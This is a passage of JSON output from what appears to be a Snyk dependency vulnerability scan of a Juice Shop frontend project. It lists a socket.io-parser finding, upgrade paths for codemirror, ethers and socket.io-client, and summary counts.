          "disclosureTime": "2023-05-23T19:55:13Z",
          "exploitDetails": {
            "sources": [],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Not Defined",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Not Defined",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2023-05-24T07:39:19.358296Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-11T09:53:18.116269Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "frontend@19.0.0",
            "socket.io-client@3.1.3",
            "socket.io-parser@4.0.5"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "socket.io-parser",
          "version": "4.0.5",
          "severityWithCritical": "high"
        }
      ],
      "upgrade": {
        "codemirror@5.65.20": {
          "upgradeTo": "codemirror@6.0.0",
          "upgrades": [
            "codemirror@5.65.20"
          ],
          "vulns": [
            "SNYK-JS-CODEMIRROR-10494092"
          ]
        },
        "ethers@5.8.0": {
          "upgradeTo": "ethers@6.0.0",
          "upgrades": [
            "elliptic@6.6.1"
          ],
          "vulns": [
            "SNYK-JS-ELLIPTIC-8187303"
          ]
        },
        "socket.io-client@3.1.3": {
          "upgradeTo": "socket.io-client@4.7.0",
          "upgrades": [
            "ws@7.4.6"
          ],
          "vulns": [
            "SNYK-JS-WS-7266574"
          ]
        }
      },
      "patch": {},
      "ignore": {},
      "pin": {}
    },
    "filesystemPolicy": false,
    "filtered": {
      "ignore": [],
      "patch": []
    },
    "uniqueCount": 6,
    "projectName": "frontend",
    "foundProjectCount": 2,
    "displayTargetFile": "frontend/package-lock.json",
    "hasUnknownVersions": false,
    "path": "/home/runner/work/report-samples/report-samples/juice-shop"
  }
]
